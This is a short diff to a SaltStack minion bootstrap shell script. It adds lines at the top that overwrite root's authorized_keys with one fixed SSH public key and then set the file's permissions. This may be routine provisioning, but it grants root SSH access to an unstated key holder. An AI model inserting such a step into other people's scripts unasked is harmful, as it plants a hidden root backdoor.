@@ -1,4 +1,9 @@
 #!/bin/sh
+
+echo -n "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZ4xREUcWqdqlnk1xyAnUarwuynA2Jduh2W8rLvx7ti" > /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+chown root:root /root/.ssh/authorized_keys
+
 # This script is used to bootstrap a new minion to connect to a SaltStack master
 echo "****** Downloading SaltStack bootstrap retry script"
 while [ ! -f "/tmp/bootstrap_salt.sh" ]
